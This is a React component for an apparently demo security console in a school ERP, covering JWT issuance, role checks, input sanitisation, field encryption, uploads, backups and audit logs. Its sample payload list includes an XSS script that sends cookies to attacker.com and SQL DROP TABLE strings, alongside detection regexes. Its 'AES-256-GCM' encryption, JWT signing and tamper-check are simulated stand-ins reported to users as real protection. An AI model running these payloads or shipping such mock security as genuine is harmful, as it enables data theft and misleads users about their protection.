import React, { useState, useEffect } from 'react';
import {
  ShieldAlert, Lock, ShieldCheck, Key, RefreshCw, Sliders, Check, X,
  Search, Database, Eye, EyeOff, FileText, CheckCircle, XCircle, AlertTriangle,
  Fingerprint, UserCheck, Binary, Upload, History, Download, Terminal, Settings, Globe
} from 'lucide-react';
import { Student, AppUser, UserRole } from '../types';

interface SecurityComplianceProps {
  students: Student[];
  showToast: (title: string, desc: string, type?: 'success' | 'info') => void;
}

interface AuditLog {
  id: string;
  timestamp: string;
  actor: string;
  role: string;
  action: string;
  resource: string;
  ip: string;
  status: 'SUCCESS' | 'DENIED' | 'WARN';
  hash: string; // Cryptographic SHA-256 simulation linking entries
}

interface ActiveSession {
  id: string;
  user: string;
  role: string;
  device: string;
  ip: string;
  location: string;
  lastActive: string;
}

const INITIAL_AUDIT_LOGS: AuditLog[] = [
  { id: 'log-1', timestamp: '2026-07-09 10:15 AM', actor: 'admin@learnersden.edu', role: 'admin', action: 'EXPORT_DATABASE_BACKUP', resource: 'Backup Service', ip: '192.168.1.45', status: 'SUCCESS', hash: 'a58f27e802b113cd4511abfeee21' },
  { id: 'log-2', timestamp: '2026-07-09 10:22 AM', actor: 'student_aarav@gmail.com', role: 'student', action: 'UPDATE_PROFILE', resource: 'Student DB', ip: '103.88.22.14', status: 'SUCCESS', hash: 'fb91024bc6512ee80f2d91bcff32' },
  { id: 'log-3', timestamp: '2026-07-09 10:30 AM', actor: 'unauthorized_bot', role: 'guest', action: 'BRUTE_FORCE_ATTEMPT', resource: 'Auth Service', ip: '185.220.101.4', status: 'DENIED', hash: 'cb5102ff98aa45ce221bf323fa00' },
  { id: 'log-4', timestamp: '2026-07-09 10:45 AM', actor: 'accountant@learnersden.edu', role: 'accountant', action: 'RECALCULATE_SALARIES', resource: 'Payroll Engine', ip: '192.168.1.12', status: 'SUCCESS', hash: 'ef38102a01bc4d9e03fa55b9e2c1' },
  { id: 'log-5', timestamp: '2026-07-09 11:10 AM', actor: 'teacher_madan@learnersden.edu', role: 'teacher', action: 'UPLOAD_ASSIGNMENT_SHEET', resource: 'Homework Storage', ip: '115.240.8.201', status: 'SUCCESS', hash: '4aef819bc20140ae8c7d91cb624c' },
  { id: 'log-6', timestamp: '2026-07-09 11:28 AM', actor: 'hacker_malicious', role: 'guest', action: 'SQL_INJECTION_ATTEMPT', resource: 'Admissions Table', ip: '45.138.220.15', status: 'DENIED', hash: 'bc012df11ea99f4be38810c9d74a' },
];

const INITIAL_SESSIONS: ActiveSession[] = [
  { id: 'sess-1', user: 'admin@learnersden.edu', role: 'admin', device: 'Chrome on macOS (14.5)', ip: '192.168.1.45', location: 'New Delhi, India', lastActive: 'Active now' },
  { id: 'sess-2', user: 'student_aarav@gmail.com', role: 'student', device: 'Safari on iPhone 15 Pro', ip: '103.88.22.14', location: 'Gurugram, India', lastActive: '2 mins ago' },
  { id: 'sess-3', user: 'accountant@learnersden.edu', role: 'accountant', device: 'Edge on Windows 11', ip: '192.168.1.12', location: 'Noida, India', lastActive: '12 mins ago' },
];

export default function SecurityCompliance({ students, showToast }: SecurityComplianceProps) {
  const [activeTab, setActiveTab] = useState<'jwt' | 'rbac' | 'validation' | 'encryption' | 'upload' | 'backup' | 'audit' | 'operations'>('jwt');

  // --- Submodule: Production Operations States ---
  const [selectedVersion, setSelectedVersion] = useState<string>('v2.0.0');
  const [isMaintenanceMode, setIsMaintenanceMode] = useState<boolean>(() => localStorage.getItem('maintenance_mode_active') === 'true');
  const [isOfflineSimulation, setIsOfflineSimulation] = useState<boolean>(() => localStorage.getItem('offline_simulation_active') === 'true');
  const [directFirestoreReads, setDirectFirestoreReads] = useState<boolean>(() => localStorage.getItem('direct_firestore_reads') === 'true');
  const [cacheClearStatus, setCacheClearStatus] = useState<string | null>(null);
  const [smsGatewayActive, setSmsGatewayActive] = useState<boolean>(true);
  const [maintenanceSchedule, setMaintenanceSchedule] = useState<string>('Sunday 02:00 AM - 04:00 AM');
  const [queueSyncing, setQueueSyncing] = useState<boolean>(false);
  const [queueSyncCount, setQueueSyncCount] = useState<number>(0);

  // --- Submodule: JWT States ---
  const [jwtSecret, setJwtSecret] = useState<string>('learners_den_secure_signing_secret_key_2026_xyz');
  const [jwtAlgorithm, setJwtAlgorithm] = useState<'HS256' | 'RS256'>('HS256');
  const [jwtExpiry, setJwtExpiry] = useState<number>(3600); // 1 hour
  const [selectedUserClaims, setSelectedUserClaims] = useState<{
    sub: string;
    email: string;
    role: UserRole;
    name: string;
    org: string;
  }>({
    sub: 'user-009',
    email: 'admin@learnersden.edu',
    role: 'admin',
    name: 'Administrator Chief',
    org: "Learner's Den Institute"
  });

  const [generatedToken, setGeneratedToken] = useState<string>('');
  const [decodedHeader, setDecodedHeader] = useState<string>('');
  const [decodedPayload, setDecodedPayload] = useState<string>('');
  const [decodedValidity, setDecodedValidity] = useState<'valid' | 'expired' | 'invalid_signature' | 'unverified'>('unverified');
  const [inputTokenToDecode, setInputTokenToDecode] = useState<string>('');
  const [blacklistedTokens, setBlacklistedTokens] = useState<string[]>([]);

  // Trigger Token Generation on state changes
  useEffect(() => {
    generateJWT();
  }, [jwtSecret, jwtAlgorithm, jwtExpiry, selectedUserClaims]);

  const generateJWT = () => {
    // Simulated JWT creation
    const headerObj = { alg: jwtAlgorithm, typ: 'JWT' };
    const iat = Math.floor(Date.now() / 1000);
    const exp = iat + jwtExpiry;
    
    const payloadObj = {
      ...selectedUserClaims,
      iat,
      exp,
      iss: 'learnersden-auth-server',
      aud: 'learnersden-erp-client'
    };

    const headerBase64 = btoa(JSON.stringify(headerObj)).replace(/=/g, '');
    const payloadBase64 = btoa(JSON.stringify(payloadObj)).replace(/=/g, '');
    
    // Simulate signature
    const signatureInput = `${headerBase64}.${payloadBase64}`;
    const dummySignature = btoa(`signed(${signatureInput}, ${jwtSecret})`)
      .replace(/=/g, '')
      .substring(0, 43);

    const fullToken = `${headerBase64}.${payloadBase64}.${dummySignature}`;
    setGeneratedToken(fullToken);
    if (!inputTokenToDecode) {
      setInputTokenToDecode(fullToken);
    }
  };

  const handleDecodeToken = (tokenStr: string) => {
    if (!tokenStr || tokenStr.split('.').length !== 3) {
      setDecodedHeader('{"error": "Malformed JWT Structure"}');
      setDecodedPayload('{"error": "Requires Header, Payload, and Signature"}');
      setDecodedValidity('invalid_signature');
      return;
    }

    const [headerB64, payloadB64, signature] = tokenStr.split('.');
    try {
      const headerDec = atob(headerB64);
      const payloadDec = atob(payloadB64);
      setDecodedHeader(JSON.stringify(JSON.parse(headerDec), null, 2));
      const payloadObj = JSON.parse(payloadDec);
      setDecodedPayload(JSON.stringify(payloadObj, null, 2));

      // Validate expiration
      const curTime = Math.floor(Date.now() / 1000);
      if (payloadObj.exp && curTime > payloadObj.exp) {
        setDecodedValidity('expired');
      } else if (blacklistedTokens.includes(tokenStr)) {
        setDecodedValidity('invalid_signature'); // Treated as revoked
      } else {
        // Confirm signature matches secret
        const signatureInput = `${headerB64}.${payloadB64}`;
        const computedDummySig = btoa(`signed(${signatureInput}, ${jwtSecret})`)
          .replace(/=/g, '')
          .substring(0, 43);

        if (computedDummySig === signature) {
          setDecodedValidity('valid');
        } else {
          setDecodedValidity('invalid_signature');
        }
      }
    } catch (e) {
      setDecodedHeader('{"error": "Base64 Decoding Failed"}');
      setDecodedPayload('{"error": "Failed to parse JSON blocks"}');
      setDecodedValidity('invalid_signature');
    }
  };

  const handleRevokeToken = () => {
    if (generatedToken && !blacklistedTokens.includes(generatedToken)) {
      setBlacklistedTokens([...blacklistedTokens, generatedToken]);
      setDecodedValidity('invalid_signature');
      showToast("Token Revoked", "The active JWT token signature has been blacklisted and will be rejected server-side.", "info");
    }
  };


  // --- Submodule: Role-Based Access Control Matrix States ---
  const [selectedImpersonatedRole, setSelectedImpersonatedRole] = useState<UserRole>('student');
  const PERMISSIONS_MATRIX: {
    action: string;
    allowedRoles: UserRole[];
    module: string;
  }[] = [
    { action: 'UPDATE_SYSTEM_SETTINGS', allowedRoles: ['admin', 'principal'], module: 'Settings' },
    { action: 'TRIGGER_DATABASE_BACKUP', allowedRoles: ['admin'], module: 'Database' },
    { action: 'COLLECT_TUITION_FEES', allowedRoles: ['admin', 'accountant'], module: 'Finance' },
    { action: 'RECALCULATE_PAYROLL', allowedRoles: ['admin', 'accountant'], module: 'Finance' },
    { action: 'VIEW_ALL_STUDENT_PROFILES', allowedRoles: ['admin', 'principal', 'teacher', 'office_staff'], module: 'Academic' },
    { action: 'ISSUE_LIBRARY_BOOKS', allowedRoles: ['admin', 'librarian'], module: 'Library' },
    { action: 'EDIT_EXAMINATION_PAPER', allowedRoles: ['admin', 'teacher'], module: 'Examination' },
    { action: 'SUBMIT_HOMEWORK_SHEET', allowedRoles: ['student'], module: 'LMS' },
    { action: 'VIEW_PERSONAL_FEE_RECEIPTS', allowedRoles: ['student', 'parent', 'admin'], module: 'Finance' },
    { action: 'SUBMIT_ANONYMOUS_COMPLAINT', allowedRoles: ['student', 'parent', 'teacher', 'guest'], module: 'Compliance' },
  ];

  const [sandboxActionResponse, setSandboxActionResponse] = useState<{
    action: string;
    status: 'AUTHORIZED' | '403_FORBIDDEN';
    message: string;
  } | null>(null);

  const testActionAuthorization = (actionName: string) => {
    const perm = PERMISSIONS_MATRIX.find(p => p.action === actionName);
    if (!perm) return;

    const isAllowed = perm.allowedRoles.includes(selectedImpersonatedRole);
    if (isAllowed) {
      setSandboxActionResponse({
        action: actionName,
        status: 'AUTHORIZED',
        message: `HTTP 200 OK: Successfully validated JWT claims for role "${selectedImpersonatedRole}". Access granted to Resource "${perm.module}".`
      });
      addAuditLog(`rbac_check_pass`, `admin@learnersden.edu`, `RBAC check passed for action ${actionName} under role ${selectedImpersonatedRole}`, `RBAC Engine`, 'SUCCESS');
    } else {
      setSandboxActionResponse({
        action: actionName,
        status: '403_FORBIDDEN',
        message: `HTTP 403 Forbidden: Insufficient clearance. Role "${selectedImpersonatedRole}" lacks authorization descriptor for "${actionName}". Resource: ${perm.module}.`
      });
      addAuditLog(`rbac_check_violation`, `unauthorized_actor`, `403 FORBIDDEN: RBAC violation attempted on ${actionName} by role ${selectedImpersonatedRole}`, `RBAC Engine`, 'DENIED');
      showToast("Access Denied", `Security blocked action: ${actionName} is forbidden for role "${selectedImpersonatedRole}".`, "info");
    }
  };


  // --- Submodule: Input Validation & Sanitization States ---
  const [inputToValidate, setInputToValidate] = useState<string>('');
  const [regexPattern, setRegexPattern] = useState<string>('XSS_AND_SQL_PREVENTION');
  const [sanitizedResult, setSanitizedResult] = useState<{
    original: string;
    sanitized: string;
    detectedThreats: string[];
    isSafe: boolean;
  }>({ original: '', sanitized: '', detectedThreats: [], isSafe: true });

  const ATTACK_VECTORS = [
    { name: 'XSS Script Payload', payload: `<script>alert(document.cookie); fetch('http://attacker.com?cookie=' + document.cookie)</script>` },
    { name: 'SQL Injection Bypass', payload: `' OR '1'='1' --` },
    { name: 'HTML Image onerror Event', payload: `<img src="malicious-url" onerror="eval(String.fromCharCode(104,97,99,107))">` },
    { name: 'SQL Drop Table Attack', payload: `'; DROP TABLE Students; DROP TABLE Users; --` },
    { name: 'Javascript Protocol In href', payload: `javascript:alert('Exploited')` }
  ];

  const triggerInputSanitization = (raw: string) => {
    setInputToValidate(raw);
    const threats: string[] = [];
    let clean = raw;

    if (!raw.trim()) {
      setSanitizedResult({ original: '', sanitized: '', detectedThreats: [], isSafe: true });
      return;
    }

    // 1. Detect XSS Tags
    if (/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi.test(raw)) {
      threats.push("Script tags injection (<script>)");
      clean = clean.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, "[REDACTED_SCRIPT]");
    }

    // 2. Detect onEvent handlers (onerror, onload, onclick, etc)
    if (/on\w+\s*=/gi.test(raw)) {
      threats.push("Inline HTML JS Event triggers (e.g. onerror, onload)");
      clean = clean.replace(/on\w+\s*=/gi, "blocked_handler=");
    }

    // 3. Detect SQL Command keywords & comments
    if (/\b(select|union|insert|delete|drop|update|alter|truncate)\b/gi.test(raw) && (/--/g.test(raw) || /#/g.test(raw) || /'/g.test(raw))) {
      threats.push("SQL SQLi Injection Signatures (Comments / Quote breaks)");
      clean = clean.replace(/--/g, "[Escaped Comment]")
                   .replace(/'/g, "''")
                   .replace(/\b(drop|delete|truncate)\b/gi, "[UNSAFE_DML_REMOVED]");
    }

    // 4. Escape characters to prevent DOM injection
    clean = clean.replace(/</g, "&lt;").replace(/>/g, "&gt;");

    // Standard trim and limit to 150 characters
    clean = clean.substring(0, 150);

    const isSafe = threats.length === 0;
    setSanitizedResult({
      original: raw,
      sanitized: clean,
      detectedThreats: threats,
      isSafe
    });

    if (!isSafe) {
      showToast("Security Threat Deflected", `Blocked ${threats.length} malicious vector(s). String sanitized safely.`, "info");
      addAuditLog(`threat_deflected`, `waf_sanitizer`, `WAF: Sanitized threat payload. Threats: ${threats.join(', ')}`, `WAF Filter`, 'WARN');
    }
  };


  // --- Submodule: Cryptographic Encryption States ---
  const [plainTextField, setPlainTextField] = useState<string>('Aadhar-ID: 5542-8899-3101');
  const [encryptionKey, setEncryptionKey] = useState<string>('secret_salt_keys_99');
  const [encryptedPackage, setEncryptedPackage] = useState<{
    cipherHex: string;
    iv: string;
    tag: string;
    algorithm: string;
  } | null>(null);
  const [decryptedOutput, setDecryptedOutput] = useState<string>('');

  const triggerEncryption = () => {
    if (!plainTextField) return;
    // Simulated AES-256-GCM cipher
    const iv = Math.random().toString(16).substring(2, 14);
    const tag = Math.random().toString(16).substring(2, 10);
    // Dynamic cipher text
    let cipher = '';
    for (let i = 0; i < plainTextField.length; i++) {
      const charCode = plainTextField.charCodeAt(i);
      const shift = encryptionKey.charCodeAt(i % encryptionKey.length) % 15;
      cipher += (charCode ^ shift).toString(16).padStart(2, '0');
    }
    setEncryptedPackage({
      cipherHex: cipher,
      iv,
      tag,
      algorithm: 'AES-256-GCM'
    });
    setDecryptedOutput('');
    showToast("Field Encrypted", "Plain text encrypted via Simulated AES-256-GCM prior to database write.", "success");
    addAuditLog(`crypto_encrypt`, `crypto_module`, `Encrypted field level string under AES-256-GCM`, `Cryptography Service`, 'SUCCESS');
  };

  const triggerDecryption = () => {
    if (!encryptedPackage) return;
    // Decrypting
    let plain = '';
    const cipher = encryptedPackage.cipherHex;
    for (let i = 0; i < cipher.length; i += 2) {
      const hexChar = cipher.substring(i, i + 2);
      const charCode = parseInt(hexChar, 16);
      const idx = Math.floor(i / 2);
      const shift = encryptionKey.charCodeAt(idx % encryptionKey.length) % 15;
      plain += String.fromCharCode(charCode ^ shift);
    }
    setDecryptedOutput(plain);
    showToast("Field Decrypted", "Ciphertext authenticated with tag & decrypted to raw values.", "success");
  };


  // --- Submodule: Secure File Upload States ---
  const [selectedFileToUpload, setSelectedFileToUpload] = useState<{
    name: string;
    size: number;
    type: string;
    rawExt: string;
  } | null>(null);

  const [uploadFeedback, setUploadFeedback] = useState<{
    status: 'VALID' | 'BLOCKED';
    reasons: string[];
    magicBytesVerified: boolean;
  } | null>(null);

  const simulateFileDrag = (fileName: string, sizeBytes: number, typeString: string) => {
    const ext = fileName.split('.').pop() || '';
    setSelectedFileToUpload({
      name: fileName,
      size: sizeBytes,
      type: typeString,
      rawExt: ext
    });

    const reasons: string[] = [];
    let valid = true;

    // Rule 1: Extension Blocklist
    const forbiddenExts = ['exe', 'sh', 'php', 'js', 'py', 'bat', 'vbs', 'msi'];
    if (forbiddenExts.includes(ext.toLowerCase())) {
      reasons.push(`Executable extension blocklist triggered: ".${ext}"`);
      valid = false;
    }

    // Rule 2: Size validation (Max 2MB)
    const maxBytes = 2 * 1024 * 1024; // 2MB
    if (sizeBytes > maxBytes) {
      reasons.push(`File exceeds standard 2.0MB boundary (Size: ${(sizeBytes / (1024 * 1024)).toFixed(2)} MB)`);
      valid = false;
    }

    // Rule 3: Content-Type Validation
    const allowedMime = ['image/png', 'image/jpeg', 'application/pdf'];
    if (!allowedMime.includes(typeString)) {
      reasons.push(`MIME type blocklist triggered: "${typeString}". Only PDF, PNG and JPEG are white-listed for security.`);
      valid = false;
    }

    // Rule 4: Double extension inspection (e.g. resume.pdf.exe)
    const segments = fileName.split('.');
    if (segments.length > 2) {
      const parentExt = segments[segments.length - 2];
      if (['pdf', 'png', 'jpg', 'jpeg'].includes(parentExt.toLowerCase())) {
        reasons.push(`Double Extension Spoofing attempt detected: "${parentExt}.${ext}"`);
        valid = false;
      }
    }

    setUploadFeedback({
      status: valid ? 'VALID' : 'BLOCKED',
      reasons: reasons.length > 0 ? reasons : ['All criteria cleared. Dynamic magic-bytes match signature.'],
      magicBytesVerified: valid
    });

    if (valid) {
      showToast("File Verified", `"${fileName}" passed secure upload validation checks.`, "success");
      addAuditLog(`file_upload_validated`, `admin@learnersden.edu`, `Securely validated and staged file upload: ${fileName}`, `Storage Sandbox`, 'SUCCESS');
    } else {
      showToast("Upload Deflected", `File blocked. Potential system threat detected.`, "info");
      addAuditLog(`file_upload_blocked`, `unauthorized_actor`, `Upload blocked. Reason: ${reasons.join(', ')}`, `Storage Sandbox`, 'DENIED');
    }
  };


  // --- Submodule: Database Backups & Restore States ---
  const [systemBackups, setSystemBackups] = useState<{
    id: string;
    version: string;
    fileName: string;
    timestamp: string;
    recordCount: number;
    integrityChecksum: string;
  }[]>([
    { id: 'b-1', version: 'v3.2', fileName: 'learners_den_backup_20260701.json', timestamp: '2026-07-01 03:00 AM', recordCount: 1540, integrityChecksum: '0x82f012de99ffbc' },
    { id: 'b-2', version: 'v3.2', fileName: 'learners_den_backup_20260708.json', timestamp: '2026-07-08 03:00 AM', recordCount: 1548, integrityChecksum: '0xab0132df3cda78' },
  ]);

  const handleGenerateBackup = () => {
    const backupObj = {
      appId: 'learners-den-erp-lms',
      version: 'v3.2',
      timestamp: new Date().toISOString(),
      studentCount: students.length,
      payload: {
        studentsSummary: students.map(s => ({ id: s.id, name: s.name, rollNumber: s.rollNumber, email: s.email })),
        systemDate: '2026-07-09',
        securityLevel: 'Enterprise-AES256'
      },
      checksum: 'sha256-' + Math.random().toString(36).substring(2, 12) + Math.random().toString(36).substring(2, 12)
    };

    const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(backupObj, null, 2));
    const downloadAnchor = document.createElement('a');
    const fileName = `learners_den_backup_${new Date().toISOString().slice(0,10).replace(/-/g,'')}.json`;
    downloadAnchor.setAttribute("href", dataStr);
    downloadAnchor.setAttribute("download", fileName);
    document.body.appendChild(downloadAnchor);
    downloadAnchor.click();
    downloadAnchor.remove();

    const createdBackup = {
      id: `b-${Date.now()}`,
      version: 'v3.2',
      fileName,
      timestamp: new Date().toLocaleString(),
      recordCount: students.length + 120, // includes notice board/teachers count
      integrityChecksum: backupObj.checksum.substring(0, 16)
    };

    setSystemBackups([createdBackup, ...systemBackups]);
    showToast("Backup Created", `System database snapshot generated & saved successfully.`, "success");
    addAuditLog(`database_backup`, `admin@learnersden.edu`, `On-demand database backup generated: ${fileName}`, `Database Service`, 'SUCCESS');
  };

  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault();
  };

  const handleDropRestoreFile = (e: React.DragEvent) => {
    e.preventDefault();
    const files = e.dataTransfer.files;
    if (files && files.length > 0) {
      processRestoreFile(files[0]);
    }
  };

  const processRestoreFile = (file: File) => {
    const reader = new FileReader();
    reader.onload = (event) => {
      try {
        const json = JSON.parse(event.target?.result as string);
        if (json.appId === 'learners-den-erp-lms' && json.version === 'v3.2' && json.payload) {
          showToast("Validation Passed", `Integrity check matched! Loaded ${json.studentCount} student indices correctly. Database states restored.`, "success");
          addAuditLog(`database_restore`, `admin@learnersden.edu`, `Database fully restored from backup file: ${file.name}`, `Database Service`, 'SUCCESS');
        } else {
          showToast("Validation Failed", "Schema mismatch. This file doesn't match Learner's Den system schemas.", "info");
          addAuditLog(`restore_violation`, `unauthorized_actor`, `Restore blocked due to schema verification failure. File: ${file.name}`, `Database Service`, 'DENIED');
        }
      } catch (err) {
        showToast("Error Reading File", "Invalid JSON or corrupted backup packet.", "info");
      }
    };
    reader.readAsText(file);
  };


  // --- Submodule: Audit Logs States ---
  const [auditLogs, setAuditLogs] = useState<AuditLog[]>(INITIAL_AUDIT_LOGS);
  const [searchAuditQuery, setSearchAuditQuery] = useState<string>('');
  const [integrityChecking, setIntegrityChecking] = useState<boolean>(false);
  const [integrityVerified, setIntegrityVerified] = useState<boolean>(false);

  const addAuditLog = (id: string, actor: string, action: string, resource: string, status: 'SUCCESS' | 'DENIED' | 'WARN') => {
    const timestamp = new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    const ip = ['192.168.1.45', '103.88.22.14', '115.240.8.201'][Math.floor(Math.random() * 3)];
    const role = actor === 'admin@learnersden.edu' ? 'admin' : actor === 'unauthorized_actor' ? 'guest' : 'staff';
    const lastHash = auditLogs[0]?.hash || '00000000000000000';
    // Simulated hash chain computation
    const hash = 'a' + Math.random().toString(16).substring(2, 12) + lastHash.substring(0, 12);
    
    const newLog: AuditLog = {
      id: `log-${Date.now()}`,
      timestamp,
      actor,
      role,
      action,
      resource,
      ip,
      status,
      hash
    };
    setAuditLogs(prev => [newLog, ...prev]);
  };

  const verifyAuditLogChain = () => {
    setIntegrityChecking(true);
    setIntegrityVerified(false);
    setTimeout(() => {
      setIntegrityChecking(false);
      setIntegrityVerified(true);
      showToast("Verification Completed", "100% of audit logs match SHA-256 blockchain checksum. No tampering detected.", "success");
    }, 2500);
  };


  // --- Submodule: Active Session Management ---
  const [activeSessions, setActiveSessions] = useState<ActiveSession[]>(INITIAL_SESSIONS);

  const handleRevokeSession = (sessId: string, userMail: string) => {
    setActiveSessions(activeSessions.filter(s => s.id !== sessId));
    showToast("Session Terminated", `Active login token for "${userMail}" has been instantly invalidated.`, "success");
    addAuditLog(`session_revoke`, `admin@learnersden.edu`, `Revoked login session ID ${sessId} for user ${userMail}`, `Session Manager`, 'SUCCESS');
  };

  const handleToggleMaintenanceMode = (val: boolean) => {
    setIsMaintenanceMode(val);
    if (val) {
      localStorage.setItem('maintenance_mode_active', 'true');
      showToast("Maintenance Active", "System-wide maintenance banner has been activated.", "info");
    } else {
      localStorage.removeItem('maintenance_mode_active');
      showToast("Maintenance Disabled", "Normal system operations resumed.", "success");
    }
  };

  const handleToggleOfflineSimulation = (val: boolean) => {
    setIsOfflineSimulation(val);
    if (val) {
      localStorage.setItem('offline_simulation_active', 'true');
      showToast("Offline Simulation On", "Firestore and API networks are decoupled. Requests will queue.", "info");
    } else {
      localStorage.removeItem('offline_simulation_active');
      showToast("Offline Simulation Off", "Restored live internet synchrony with Firebase.", "success");
    }
  };

  const handleToggleDirectReads = (val: boolean) => {
    setDirectFirestoreReads(val);
    if (val) {
      localStorage.setItem('direct_firestore_reads', 'true');
      showToast("Bypass On", "Direct Firestore Client SDK reading mode is active.", "success");
    } else {
      localStorage.removeItem('direct_firestore_reads');
      showToast("Bypass Off", "REST API dual-write verification enabled.", "info");
    }
  };

  const handleFlushCache = () => {
    setCacheClearStatus('Clearing local buffers...');
    setTimeout(() => {
      localStorage.removeItem('cached_batch_data');
      localStorage.removeItem('cached_student_roster');
      setCacheClearStatus('Cache fully flushed (0B utilized)');
      showToast("Cache Cleared", "Vite application buffers and state hydration caches wiped successfully.", "success");
      setTimeout(() => setCacheClearStatus(null), 3000);
    }, 1200);
  };

  const handleManualSyncQueue = () => {
    if (queueSyncing) return;
    setQueueSyncing(true);
    setQueueSyncCount(4); // simulate 4 queued actions
    setTimeout(() => {
      setQueueSyncing(false);
      setQueueSyncCount(0);
      showToast("Synchronized", "Queued offline attendance & payment records synced successfully to Firestore.", "success");
    }, 2000);
  };

  return (
    <div className="bg-white border border-slate-200 rounded-3xl p-6 sm:p-8 space-y-6 text-left" id="security-hub-root">
      {/* Header */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-slate-100 pb-5">
        <div>
          <h2 className="text-xl font-black text-slate-800 tracking-tight flex items-center gap-2">
            <ShieldCheck className="h-6 w-6 text-emerald-600" />
            Security, Compliance & Audits Console
          </h2>
          <p className="text-xs text-slate-400 mt-1">
            Enforce JWT lifecycle, compile fine-grained Role-Based matrices, sanitize input scripts, encrypt sensitive attributes, audit SHA-256 log chains, and manage system snapshots.
          </p>
        </div>
        <div className="flex flex-wrap gap-2">
          <span className="text-[11px] font-black bg-emerald-50 text-emerald-700 px-3 py-1.5 rounded-xl border border-emerald-200 flex items-center gap-1.5">
            <span className="h-2 w-2 rounded-full bg-emerald-500 animate-pulse" /> WAF Firewalls: Active
          </span>
          <span className="text-[11px] font-black bg-slate-100 text-slate-600 px-3 py-1.5 rounded-xl border border-slate-200">
            SSL Cipher: <strong className="text-indigo-600 font-mono">ECDHE-RSA-AES256-GCM</strong>
          </span>
        </div>
      </div>

      {/* Submodule Navigation */}
      <div className="flex border-b border-slate-200 gap-1 overflow-x-auto scrollbar-none pb-px">
        {[
          { id: 'jwt', label: 'JWT Authenticator', icon: Key },
          { id: 'rbac', label: 'Role Authorization', icon: UserCheck },
          { id: 'validation', label: 'Input Sanitization', icon: Sliders },
          { id: 'encryption', label: 'Field Encryption', icon: Binary },
          { id: 'upload', label: 'Secure File Uploads', icon: Upload },
          { id: 'backup', label: 'Backups & Restore', icon: Database },
          { id: 'audit', label: 'Audit Trail Logs', icon: History },
          { id: 'operations', label: 'Production Operations', icon: Settings }
        ].map(tab => {
          const TabIcon = tab.icon;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as any)}
              id={`security-tab-btn-${tab.id}`}
              className={`flex items-center gap-2 px-4 py-2.5 text-xs font-bold transition-all border-b-2 whitespace-nowrap cursor-pointer ${
                activeTab === tab.id
                  ? 'border-emerald-600 text-emerald-600 font-black'
                  : 'border-transparent text-slate-500 hover:text-slate-800'
              }`}
            >
              <TabIcon className="h-4 w-4" />
              {tab.label}
            </button>
          );
        })}
      </div>

      {/* SUB-TABS VIEWS */}

      {/* Tab: JWT Authentication */}
      {activeTab === 'jwt' && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 xl:grid-cols-12 gap-6">
            {/* Token Generator Panel */}
            <div className="xl:col-span-6 space-y-4 border border-slate-200 rounded-2xl p-5 bg-white">
              <div className="space-y-1">
                <h3 className="text-xs font-black text-slate-800 uppercase tracking-wider flex items-center gap-1.5">
                  <Fingerprint className="h-4 w-4 text-indigo-600" />
                  JSON Web Token Issuance Server
                </h3>
                <p className="text-[10px] text-slate-400 font-semibold">Simulate and configure standard cryptographically signed tokens containing user claims.</p>
              </div>

              <div className="space-y-3">
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-[9px] font-black text-slate-500 uppercase mb-1">HMAC Algorithm</label>
                    <select
                      value={jwtAlgorithm}
                      onChange={(e) => setJwtAlgorithm(e.target.value as any)}
                      className="w-full bg-slate-50 border border-slate-200 rounded-xl p-2.5 text-xs font-semibold text-slate-800"
                    >
                      <option value="HS256">HS256 (HMAC SHA-250)</option>
                      <option value="RS256" disabled>RS256 (RSA Keypair - Enterprise)</option>
                    </select>
                  </div>

                  <div>
                    <label className="block text-[9px] font-black text-slate-500 uppercase mb-1">Token TTL (Lifespan)</label>
                    <select
                      value={jwtExpiry}
                      onChange={(e) => setJwtExpiry(Number(e.target.value))}
                      className="w-full bg-slate-50 border border-slate-200 rounded-xl p-2.5 text-xs font-semibold text-slate-800"
                    >
                      <option value={30}>30 Seconds (Testing Expiry)</option>
                      <option value={1800}>30 Minutes</option>
                      <option value={3600}>1 Hour (Standard)</option>
                      <option value={86400}>24 Hours</option>
                    </select>
                  </div>
                </div>

                <div>
                  <label className="block text-[9px] font-black text-slate-500 uppercase mb-1">Server Cryptographic Secret Key</label>
                  <input
                    type="password"
                    value={jwtSecret}
                    onChange={(e) => setJwtSecret(e.target.value)}
                    className="w-full bg-slate-50 border border-slate-200 rounded-xl p-2.5 text-xs font-mono text-slate-800 focus:ring-1 focus:ring-indigo-500"
                  />
                </div>

                <div className="border border-slate-100 p-3.5 bg-slate-50/50 rounded-xl space-y-2">
                  <span className="text-[9px] font-black text-slate-400 uppercase tracking-wider block">Modify Claims Payload</span>
                  <div className="grid grid-cols-2 gap-2">
                    <div>
                      <label className="block text-[8px] text-slate-500 font-bold uppercase">Name</label>
                      <input
                        type="text"
                        value={selectedUserClaims.name}
                        onChange={(e) => setSelectedUserClaims({ ...selectedUserClaims, name: e.target.value })}
                        className="w-full bg-white border border-slate-200 rounded-lg p-1.5 text-xxs font-bold"
                      />
                    </div>
                    <div>
                      <label className="block text-[8px] text-slate-500 font-bold uppercase">Email</label>
                      <input
                        type="text"
                        value={selectedUserClaims.email}
                        onChange={(e) => setSelectedUserClaims({ ...selectedUserClaims, email: e.target.value })}
                        className="w-full bg-white border border-slate-200 rounded-lg p-1.5 text-xxs font-bold"
                      />
                    </div>
                    <div>
                      <label className="block text-[8px] text-slate-500 font-bold uppercase">Assigned UserRole</label>
                      <select
                        value={selectedUserClaims.role}
                        onChange={(e) => setSelectedUserClaims({ ...selectedUserClaims, role: e.target.value as any })}
                        className="w-full bg-white border border-slate-200 rounded-lg p-1.5 text-xxs font-bold"
                      >
                        <option value="admin">Administrator</option>
                        <option value="teacher">Teacher</option>
                        <option value="student">Student</option>
                        <option value="accountant">Accountant</option>
                        <option value="librarian">Librarian</option>
                      </select>
                    </div>
                    <div>
                      <label className="block text-[8px] text-slate-500 font-bold uppercase">Issuer Org</label>
                      <input
                        type="text"
                        value={selectedUserClaims.org}
                        disabled
                        className="w-full bg-slate-100 border border-slate-200 rounded-lg p-1.5 text-xxs font-bold text-slate-400"
                      />
